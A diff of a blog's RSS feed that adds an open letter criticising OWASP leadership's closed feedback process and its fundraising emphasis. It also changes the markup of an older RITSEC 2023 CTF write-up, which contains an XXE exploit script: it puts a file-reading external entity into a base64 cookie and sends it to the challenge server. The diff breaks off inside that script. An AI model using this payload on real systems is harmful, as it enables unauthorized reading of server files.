@@ -3,12 +3,135 @@
   <channel>
     <title>Leo Reading</title>
     <description>devlopr-jekyll is a beautiful Jekyll Theme Built For Developers, which is optimized for speed and readability.</description>
-    <link>/</link>
-    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 21 Nov 2025 17:21:04 +0000</pubDate>
-    <lastBuildDate>Fri, 21 Nov 2025 17:21:04 +0000</lastBuildDate>
-    <generator>Jekyll v4.3.2</generator>
+    <link>https://www.leoreading.com/</link>
+    <atom:link href="https://www.leoreading.com/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 01 Feb 2026 00:44:12 +0000</pubDate>
+    <lastBuildDate>Sun, 01 Feb 2026 00:44:12 +0000</lastBuildDate>
+    <generator>Jekyll v4.4.1</generator>
 
+    
+      <item>
+        <title>An Open Letter to OWASP Leadership: On Openness, Community, and Engagement</title>
+        <description>&lt;p&gt;To OWASP leadership,&lt;/p&gt;
+
+&lt;p&gt;I’m writing this publicly and transparently because I believe that is the spirit in which OWASP itself was founded.&lt;/p&gt;
+
+&lt;p&gt;Recently, project leaders were asked to provide feedback on the new website redesign through a private monday.com form, with no public discussion, no shared visibility into submitted feedback, and no follow-up conversation. Attempts to discuss concerns openly in email or through Slack were redirected back to the form.&lt;/p&gt;
+
+&lt;p&gt;Respectfully: this approach feels at odds with the very first word in &lt;strong&gt;Open Web Application Security Project&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;OWASP’s strength has never come from forms or funnels.&lt;br /&gt;
+It has always come from open collaboration, public discussion, and community ownership.&lt;/p&gt;
+
+&lt;p&gt;Right now, many of us who maintain projects feel eager to help — but unable to engage.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;why-this-matters&quot;&gt;Why this matters&lt;/h2&gt;
+
+&lt;p&gt;OWASP is successful and respected because of its community:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Volunteer project leaders&lt;/li&gt;
+  &lt;li&gt;Maintainers&lt;/li&gt;
+  &lt;li&gt;Contributors&lt;/li&gt;
+  &lt;li&gt;Documentation writers&lt;/li&gt;
+  &lt;li&gt;Tool builders&lt;/li&gt;
+  &lt;li&gt;Educators&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The organization’s credibility and influence come directly from this work.&lt;/p&gt;
+
+&lt;p&gt;When those same people are asked for feedback but given no venue for open dialogue or transparency, it sends an unintended message:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;“We want your input, but not your participation.”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;That is not how open communities thrive.&lt;/p&gt;
+
+&lt;p&gt;Open communities discuss in the open.&lt;br /&gt;
+They collaborate in the open.&lt;br /&gt;
+They disagree in the open.&lt;br /&gt;
+They iterate in the open.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;a-broader-concern-fundraising-vs-support&quot;&gt;A broader concern: fundraising vs. support&lt;/h2&gt;
+
+&lt;p&gt;I also want to speak candidly about something that feels uncomfortable but important.&lt;/p&gt;
+
+&lt;p&gt;There is a strong emphasis on donation calls-to-action across the site.  This is extremely clear when clicking the “Projects” nav link:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The first thing visible above the fold is a donation call-to-action rather than any actual projects.&lt;/li&gt;
+  &lt;li&gt;The button says “contribute to projects,” but links to donating money. Contribution means much more than money (code, docs, testing, advocacy).&lt;/li&gt;
+  &lt;li&gt;Viewing all projects is buried behind 3-4 clicks instead of being prominently featured&lt;/li&gt;
+  &lt;li&gt;This feels misaligned with how OWASP became successful - projects should come first, fundraising second.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These aren’t just polish issues — they impact discoverability of the very projects that make OWASP valuable.  Please remember that many project leaders:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;self-host demos&lt;/li&gt;
+  &lt;li&gt;pay for infrastructure out of pocket&lt;/li&gt;
+  &lt;li&gt;receive minimal operational support&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Speaking personally: I pay monthly hosting costs for a small OWASP project demo that OWASP has declined to cover.&lt;/p&gt;
+
+&lt;p&gt;If OWASP is investing heavily in fundraising, it’s reasonable for project maintainers to ask:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;How is that money supporting the projects that create OWASP’s value?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Featuring projects and empowering maintainers should come before donation asks.  I understand the need to fundraise - our OWASP GitHub repositories already have funding.yaml pointed to OWASP.  This just feels like a step too far.&lt;/p&gt;
+
+&lt;p&gt;Projects are the reason people donate, not the other way around.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;concrete-recommendations&quot;&gt;Concrete Recommendations&lt;/h2&gt;
+
+&lt;p&gt;Constructively, here’s what I believe would help:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Public discussion channels for website feedback (GitHub issues, discussions, Slack threads, etc.)
+    &lt;ul&gt;
+      &lt;li&gt;There is a Slack channel for the website redesign, but there is no engagement and feedback is being redirected to the aforementioned form&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Transparent tracking of reported issues and decisions&lt;/li&gt;
+  &lt;li&gt;Community working groups for major initiatives like the website&lt;/li&gt;
+  &lt;li&gt;Prioritizing project discoverability over fundraising CTAs&lt;/li&gt;
+  &lt;li&gt;Clear reinvestment of funds into project infrastructure/support&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;None of this requires more volunteers — we’re already here and willing, even with a tight and unplanned deadline like we were given in this particular case.&lt;/p&gt;
+
+&lt;p&gt;We just need to be invited into the process.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
+
+&lt;p&gt;This letter is written from a place of caring, not just frustration.&lt;/p&gt;
+
+&lt;p&gt;I contribute to OWASP because I believe in what it stands for:
+open knowledge, open collaboration, and community ownership of security.&lt;/p&gt;
+
+&lt;p&gt;If we lose openness in how we work together, we risk losing what makes OWASP special.&lt;/p&gt;
+
+&lt;p&gt;I hope we can return to a more transparent, collaborative approach, and I’m happy to help however I can. This is not a “rage-quit” letter, but instead a plea to OWASP’s leadership to stay grounded in one of the core principles of OWASP - &lt;strong&gt;openness&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;I fully plan to continue contributing to OWASP, and while this feedback may be critical, I would still suggest others become involved with OWASP if they are looking to contribute!  If you are considering contributing, check out one of the &lt;a href=&quot;https://owasp.org/projects/&quot;&gt;hundreds of OWASP Projects&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Respectfully,&lt;/p&gt;
+
+&lt;p&gt;Leo Reading&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 31 Jan 2026 04:00:00 +0000</pubDate>
+        <link>https://www.leoreading.com/blog/owasp/open-letter-to-owasp-leadership-on-openness-community-and-engagement</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/owasp/open-letter-to-owasp-leadership-on-openness-community-and-engagement</guid>
+      </item>
     
       <item>
         <title>RITSEC 2023 - Web / X-Men Lore</title>
@@ -18,7 +141,7 @@
 &lt;h2 id=&quot;cookies-on-click&quot;&gt;Cookies On Click&lt;/h2&gt;
 &lt;p&gt;After clicking around for a bit, I noticed that the URL for every x-man was the same: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/xmen&lt;/code&gt;.  This told me that we were either doing a post request or using a cookie of some kind.  After viewing the links on the main page, I noticed something a bit odd in the HTML:&lt;/p&gt;
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/xmen&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4='&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;document.cookie=&apos;xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
       Beast
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
@@ -28,8 +151,8 @@
 &lt;h2 id=&quot;the-cookie-value&quot;&gt;The Cookie Value&lt;/h2&gt;
 &lt;p&gt;First and foremost, this cookie value looks like base64 data.  Let’s decode it:&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -n 'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=' | base64 -d
-&amp;lt;?xml version='1.0' encoding='UTF-8'?&amp;gt;&amp;lt;input&amp;gt;&amp;lt;xmen&amp;gt;Beast&amp;lt;/xmen&amp;gt;&amp;lt;/input&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -n &apos;PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=&apos; | base64 -d
+&amp;lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&amp;gt;&amp;lt;input&amp;gt;&amp;lt;xmen&amp;gt;Beast&amp;lt;/xmen&amp;gt;&amp;lt;/input&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;….it’s XML? Well this just keeps getting weirder.&lt;/p&gt;
@@ -67,19 +190,19 @@
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;index.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/xmen&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;xmen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xmen&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xmen.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -94,21 +217,21 @@
 
 
 &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;hack&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://xmen-lore-web.challenges.ctf.ritsec.club/xmen&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;https://xmen-lore-web.challenges.ctf.ritsec.club/xmen&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;?xml version=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; encoding=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UTF-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&amp;gt;
 &amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;
-&amp;lt;!ENTITY xxe SYSTEM &quot;file://{command}&quot; &amp;gt;]&amp;gt;
+&amp;lt;!ENTITY xxe SYSTEM &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;file://{command}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &amp;gt;]&amp;gt;
 &amp;lt;input&amp;gt;
     &amp;lt;xmen&amp;gt;&amp;amp;xxe;&amp;lt;/xmen&amp;gt;
-&amp;lt;/input&amp;gt;&quot;&quot;&quot;&lt;/span&gt;
+&amp;lt;/input&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 
     &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xmen&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)})&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xmen&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span 